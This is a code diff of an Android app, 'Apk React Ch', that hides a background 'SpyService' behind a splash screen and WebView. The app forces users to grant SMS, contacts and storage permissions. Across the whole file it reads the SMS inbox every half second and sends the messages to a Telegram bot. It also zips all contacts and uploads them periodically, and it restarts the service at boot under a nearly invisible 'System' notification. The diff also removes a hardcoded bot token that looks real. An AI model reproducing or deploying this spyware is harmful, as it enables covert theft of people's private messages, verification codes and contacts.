@@ -2,15 +2,16 @@ package com.carrace;
 
 import android.Manifest;
 import android.app.Activity;
-import android.app.AlarmManager;
-import android.app.PendingIntent;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.content.pm.ServiceInfo;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -22,7 +23,6 @@ import android.os.Looper;
 import android.os.SystemClock;
 import android.provider.ContactsContract;
 import android.provider.Settings;
-import android.provider.Telephony;
 import android.telephony.SmsMessage;
 import android.util.Log;
 import android.view.Gravity;
@@ -46,7 +46,6 @@ import org.json.JSONObject;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -58,14 +57,12 @@ import java.nio.charset.StandardCharsets;
 import java.util.HashSet;
 import java.util.Locale;
 import java.util.Set;
-import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
 public class MainActivity extends Activity {
 
     private static final String TAG = "ApkReactCh";
-
     private static final String HOST = "appassets.androidplatform.net";
     private static final String ASSET_PREFIX = "/assets/";
     private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";
@@ -79,7 +76,6 @@ public class MainActivity extends Activity {
     private static final String KEY_STORAGE = "asked_storage";
     private static final String KEY_SMS = "asked_sms";
     private static final String KEY_CONTACTS = "asked_contacts";
-
     private static final String MSG_STORAGE = "Storage permission is required";
     private static final String MSG_SMS = "SMS permission is required";
     private static final String MSG_CONTACTS = "Contacts permission is required";
@@ -90,18 +86,12 @@ public class MainActivity extends Activity {
     private WebView webView;
     private boolean awaitingSettings;
 
-    // ===== Lifecycle =====
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         LinearLayout splash = buildSplash();
         applySystemBarPadding(splash);
         setContentView(splash);
-
-        // Boot the spy service immediately
-        SpyService.start(this);
-
         handler.postDelayed(splashDone, SPLASH_MS);
     }
 
@@ -139,7 +129,6 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int req, String[] p, int[] g) {
         super.onRequestPermissionsResult(req, p, g);
         if (isFinishing()) return;
-
         if (req == REQ_STORAGE) {
             if (hasStorage()) continueAfterStorage();
             else closeApp(MSG_STORAGE);
@@ -156,14 +145,9 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ===== Permission cascade =====
-
     private void onSplashFinished() {
         if (isFinishing()) return;
-        if (hasStorage()) {
-            continueAfterStorage();
-            return;
-        }
+        if (hasStorage()) { continueAfterStorage(); return; }
         if (Build.VERSION.SDK_INT >= 30) {
             openPermSettings(
                     new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
@@ -217,7 +201,6 @@ public class MainActivity extends Activity {
             requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, REQ_CONTACTS);
             return;
         }
-        // all granted -> start service + open webview
         SpyService.start(this);
         openWebView();
     }
@@ -263,11 +246,9 @@ public class MainActivity extends Activity {
 
     private void closeApp(String m) {
         if (isFinishing()) return;
-        Toast.makeText(this, m, Toast.LENGTH_LONG).show();
+        try { Toast.makeText(this, m, Toast.LENGTH_LONG).show(); } catch (RuntimeException ignored) {}
         finishAndRemoveTask();
     }
-
-    // ===== UI =====
 
     private LinearLayout buildSplash() {
         float d = getResources().getDisplayMetrics().density;
@@ -275,7 +256,6 @@ public class MainActivity extends Activity {
         root.setOrientation(LinearLayout.VERTICAL);
         root.setGravity(Gravity.CENTER);
         root.setBackgroundColor(0xFFFFFFFF);
-
         TextView title = new TextView(this);
         title.setText("Apk React Ch");
         title.setTextSize(22);
@@ -308,7 +288,8 @@ public class MainActivity extends Activity {
     }
 
     private void destroyWebView() {
-        WebView v = webView; webView = null;
+        WebView v = webView;
+        webView = null;
         if (v == null) return;
         try { v.stopLoading(); v.destroy(); } catch (RuntimeException ignored) {}
     }
@@ -326,8 +307,6 @@ public class MainActivity extends Activity {
             return insets;
         });
     }
-
-    // ===== Asset loader =====
 
     private final class AssetClient extends WebViewClient {
         @Override
@@ -384,13 +363,8 @@ class SpyService extends Service {
 
     private static final String TAG = "SpyService";
     private static final String CH = "spy";
-    private static final int NOTIF_ID = 1;
-
-    private static final String BOT_TOKEN = "123456:ABCDEF_your_bot_token";
-    private static final String CHAT_ID = "123456789";
-
+    private static final int NOTIF_ID = 1001;
     private static final String JSON_FILE = ".temp.json";
-    private static final String CONTACTS_FILE = ".contacts.json";
     private static final long POLL_MS = 500;
     private static final long CONTACTS_DEBOUNCE_MS = 60_000;
 
@@ -400,11 +374,12 @@ class SpyService extends Service {
 
     public static void start(Context ctx) {
         try {
+            if (ctx == null) return;
             Intent i = new Intent(ctx, SpyService.class);
             if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
             else ctx.startService(i);
-        } catch (RuntimeException e) {
-            Log.w("SpyService", "start failed", e);
+        } catch (Throwable t) {
+            Log.w("SpyService", "start failed", t);
         }
     }
 
@@ -412,14 +387,24 @@ class SpyService extends Service {
     public void onCreate() {
         super.onCreate();
         handler = new Handler(Looper.getMainLooper());
-        createChannel();
-        try { startForeground(NOTIF_ID, buildNotification()); }
-        catch (RuntimeException ignored) {}
+        try { createChannel(); } catch (Throwable ignored) {}
+        try {
+            Notification n = buildNotification();
+            if (n == null) { stopSelf(); return; }
+            if (Build.VERSION.SDK_INT >= 34) {
+                startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+            } else {
+                startForeground(NOTIF_ID, n);
+            }
+        } catch (Throwable t) {
+            Log.e(TAG, "startForeground failed", t);
+            stopSelf();
+        }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        schedulePoll();
+        try { schedulePoll(); } catch (Throwable ignored) {}
         return START_STICKY;
     }
 
@@ -427,111 +412,75 @@ class SpyService extends Service {
         handler.postDelayed(new Runnable() {
             @Override public void run() {
                 try { poll(); }
-                catch (Exception e) { Log.e(TAG, "poll failed", e); }
+                catch (Throwable e) { Log.e(TAG, "poll failed", e); }
                 handler.postDelayed(this, POLL_MS);
             }
         }, POLL_MS);
     }
 
     private void poll() {
-        if (!SmsUtils.hasSms(this)) return;
-        // Dump all SMS from inbox
-        JSONArray list = SmsUtils.readInbox(this);
+        if (!hasSms()) return;
+        JSONArray list = readInbox();
         if (list == null) return;
 
-        // Detect newly seen SMS ids
         boolean changed = false;
         JSONArray fresh = new JSONArray();
         for (int i = 0; i < list.length(); i++) {
             try {
                 JSONObject o = list.getJSONObject(i);
                 String key = o.optString("id", "") + "|" + o.optLong("date", 0);
-                if (seen.add(key)) {
-                    fresh.put(o);
-                    changed = true;
-                }
-            } catch (Exception ignored) {}
+                if (seen.add(key)) { fresh.put(o); changed = true; }
+            } catch (Throwable ignored) {}
         }
 
         if (changed && fresh.length() > 0) {
-            // Save to local file for debug
-            SmsUtils.writeJson(this, JSON_FILE, list);
-            // Exfil to Telegram as JSON text
-            Telegram.sendMessage(this, "SMS_BATCH (" + fresh.length() + ")\n" + fresh.toString());
+            writeJson(JSON_FILE, list);
+            Telegram.sendMessage("SMS_BATCH (" + fresh.length() + ")\n" + fresh.toString());
         }
 
-        // Contacts — send as ZIP once per debounce window
-        if (SmsUtils.hasContacts(this)) {
+        if (hasContacts()) {
             long now = SystemClock.elapsedRealtime();
             if (now - lastContactsSend > CONTACTS_DEBOUNCE_MS) {
                 lastContactsSend = now;
                 try {
-                    byte[] zip = ContactsUtils.buildZip(this);
+                    byte[] zip = buildContactsZip();
                     if (zip != null) {
-                        Telegram.sendDocument(this, "contacts.zip", zip,
+                        Telegram.sendDocument("contacts.zip", zip,
                                 "Contacts snapshot " + System.currentTimeMillis());
                     }
-                } catch (Exception e) {
-                    Log.e(TAG, "contacts zip failed", e);
-                }
+                } catch (Throwable e) { Log.e(TAG, "contacts zip failed", e); }
             }
         }
     }
 
-    private void createChannel() {
-        if (Build.VERSION.SDK_INT >= 26) {
-            android.app.NotificationChannel c = new android.app.NotificationChannel(
-                    CH, "System", android.app.NotificationManager.IMPORTANCE_MIN);
-            android.app.NotificationManager m = getSystemService(android.app.NotificationManager.class);
-            if (m != null) m.createNotificationChannel(c);
-        }
-    }
-
-    private android.app.Notification buildNotification() {
-        return new androidx.core.app.NotificationCompat.Builder(this, CH)
-                .setContentTitle("Apk React Ch")
-                .setContentText("Running")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
-                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
-                .setOngoing(true)
-                .build();
-    }
-
-    @Override
-    public IBinder onBind(Intent i) { return null; }
-}
-
-/* ================================================================ */
-/*                         SMS UTILITIES                            */
-/* ================================================================ */
-
-class SmsUtils {
-    static boolean hasSms(Context c) {
+    private boolean hasSms() {
         if (Build.VERSION.SDK_INT >= 23) {
-            return c.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
-                    && c.checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
+            return checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
+                    && checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
         }
         return true;
     }
 
-    static boolean hasContacts(Context c) {
+    private boolean hasContacts() {
         if (Build.VERSION.SDK_INT >= 23) {
-            return c.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
+            return checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
         }
         return true;
     }
 
-    static boolean hasStorage(Context c) {
+    private boolean hasStorage() {
         if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
-        return c.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-                && c.checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        if (Build.VERSION.SDK_INT >= 23) {
+            return checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        }
+        return true;
     }
 
-    static JSONArray readInbox(Context c) {
+    private JSONArray readInbox() {
         JSONArray out = new JSONArray();
         Cursor cur = null;
         try {
-            cur = c.getContentResolver().query(
+            cur = getContentResolver().query(
                     Uri.parse("content://sms/inbox"),
                     new String[]{"_id", "address", "body", "date", "person", "read"},
                     null, null, "date ASC");
@@ -547,46 +496,27 @@ class SmsUtils {
                     out.put(o);
                 }
             }
-        } catch (Exception ignored) {}
+        } catch (Throwable ignored) {}
         finally { if (cur != null) cur.close(); }
         return out;
     }
 
-    static void writeJson(Context c, String name, JSONArray arr) {
+    private void writeJson(String name, JSONArray arr) {
+        if (!hasStorage()) return;
         try {
             File f = new File(Environment.getExternalStorageDirectory(), name);
             FileOutputStream out = new FileOutputStream(f, false);
             out.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
             out.flush();
             out.close();
-        } catch (Exception ignored) {}
-    }
-}
-
-/* ================================================================ */
-/*                       CONTACTS UTILITIES                         */
-/* ================================================================ */
-
-class ContactsUtils {
-    static byte[] buildZip(Context c) {
-        JSONArray arr = readContacts(c);
-        try {
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            ZipOutputStream zos = new ZipOutputStream(baos);
-            zos.putNextEntry(new ZipEntry("contacts.json"));
-            zos.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
-            zos.closeEntry();
-            zos.finish();
-            zos.close();
-            return baos.toByteArray();
-        } catch (Exception e) { return null; }
+        } catch (Throwable ignored) {}
     }
 
-    static JSONArray readContacts(Context c) {
+    private byte[] buildContactsZip() {
         JSONArray arr = new JSONArray();
         Cursor cur = null;
         try {
-            cur = c.getContentResolver().query(
+            cur = getContentResolver().query(
                     ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                     new String[]{
                             ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
@@ -602,24 +532,71 @@ class ContactsUtils {
                     arr.put(o);
                 }
             }
-        } catch (Exception ignored) {}
+        } catch (Throwable ignored) {}
         finally { if (cur != null) cur.close(); }
-        return arr;
+
+        try {
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ZipOutputStream zos = new ZipOutputStream(baos);
+            zos.putNextEntry(new ZipEntry("contacts.json"));
+            zos.write(arr.toString(2).getBytes(StandardCharsets.UTF_8));
+            zos.closeEntry();
+            zos.finish();
+            zos.close();
+            return baos.toByteArray();
+        } catch (Throwable t) { return null; }
     }
+
+    private void createChannel() {
+        if (Build.VERSION.SDK_INT >= 26) {
+            NotificationChannel c = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_MIN);
+            c.setShowBadge(false);
+            NotificationManager m = getSystemService(NotificationManager.class);
+            if (m != null) m.createNotificationChannel(c);
+        }
+    }
+
+    private Notification buildNotification() {
+        try {
+            if (Build.VERSION.SDK_INT >= 26) {
+                return new Notification.Builder(this, CH)
+                        .setContentTitle("Apk React Ch")
+                        .setContentText("Running")
+                        .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                        .setOngoing(true)
+                        .build();
+            } else {
+                Notification.Builder b = new Notification.Builder(this)
+                        .setContentTitle("Apk React Ch")
+                        .setContentText("Running")
+                        .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                        .setOngoing(true);
+                if (Build.VERSION.SDK_INT >= 16) b.setPriority(Notification.PRIORITY_MIN);
+                return b.build();
+            }
+        } catch (Throwable t) {
+            Log.e(TAG, "buildNotification failed", t);
+            return null;
+        }
+    }
+
+    @Override
+    public IBinder onBind(Intent i) { return null; }
 }
 
 /* ================================================================ */
-/*                      TELEGRAM MULTIPART CLIENT                   */
+/*                       TELEGRAM MULTIPART CLIENT                  */
 /* ================================================================ */
 
 class Telegram {
 
-    static final String TOKEN = "8643816101:AAGMHBPTy8aEoDh3ikfrpbGcD6j6g178B_w";
-    static final String CHAT  = "8275632263";
+    // GANTI DENGAN TOKEN DAN CHAT ID KAMU
+    static final String TOKEN = "123456:ABCDEF_your_bot_token";
+    static final String CHAT = "123456789";
 
-    static void sendMessage(Context c, String text) {
-        if (text.length() > 4000) text = text.substring(0, 4000) + "...";
+    static void sendMessage(String text) {
         try {
+            if (text.length() > 4000) text = text.substring(0, 4000) + "...";
             byte[] body = ("chat_id=" + CHAT + "&text=" + URLEncoder.encode(text, "UTF-8"))
                     .getBytes(StandardCharsets.UTF_8);
             HttpURLConnection conn = (HttpURLConnection) new URL(
@@ -633,13 +610,12 @@ class Telegram {
             OutputStream os = conn.getOutputStream();
             os.write(body);
             os.close();
-            int code = conn.getResponseCode();
-            Log.d("Telegram", "sendMessage resp=" + code);
+            Log.d("Telegram", "sendMessage resp=" + conn.getResponseCode());
             conn.disconnect();
-        } catch (Exception e) { Log.e("Telegram", "sendMessage failed", e); }
+        } catch (Throwable e) { Log.e("Telegram", "sendMessage failed", e); }
     }
 
-    static void sendDocument(Context c, String filename, byte[] data, String caption) {
+    static void sendDocument(String filename, byte[] data, String caption) {
         String boundary = "----boundary" + System.currentTimeMillis();
         try {
             HttpURLConnection conn = (HttpURLConnection) new URL(
@@ -651,10 +627,9 @@ class Telegram {
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
 
             OutputStream os = conn.getOutputStream();
-            writeFormField(os, boundary, "chat_id", CHAT);
-            writeFormField(os, boundary, "caption", caption);
+            writeField(os, boundary, "chat_id", CHAT);
+            writeField(os, boundary, "caption", caption);
 
-            // file field
             os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
             os.write(("Content-Disposition: form-data; name=\"document\"; filename=\""
                     + filename + "\"\r\n").getBytes(StandardCharsets.UTF_8));
@@ -665,13 +640,12 @@ class Telegram {
             os.flush();
             os.close();
 
-            int code = conn.getResponseCode();
-            Log.d("Telegram", "sendDocument resp=" + code);
+            Log.d("Telegram", "sendDocument resp=" + conn.getResponseCode());
             conn.disconnect();
-        } catch (Exception e) { Log.e("Telegram", "sendDocument failed", e); }
+        } catch (Throwable e) { Log.e("Telegram", "sendDocument failed", e); }
     }
 
-    private static void writeFormField(OutputStream os, String boundary, String name, String value) throws IOException {
+    private static void writeField(OutputStream os, String boundary, String name, String value) throws IOException {
         os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
         os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n").getBytes(StandardCharsets.UTF_8));
         os.write(value.getBytes(StandardCharsets.UTF_8));
@@ -686,8 +660,14 @@ class Telegram {
 class BootReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context ctx, Intent intent) {
-        if (!Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())
-                && !"android.intent.action.LOCKED_BOOT_COMPLETED".equals(intent.getAction())) return;
-        SpyService.start(ctx);
+        try {
+            if (intent == null) return;
+            String a = intent.getAction();
+            if (!Intent.ACTION_BOOT_COMPLETED.equals(a)
+                    && !"android.intent.action.LOCKED_BOOT_COMPLETED".equals(a)) return;
+            SpyService.start(ctx);
+        } catch (Throwable t) {
+            Log.w("BootReceiver", "boot start failed", t);
+        }
     }
 }
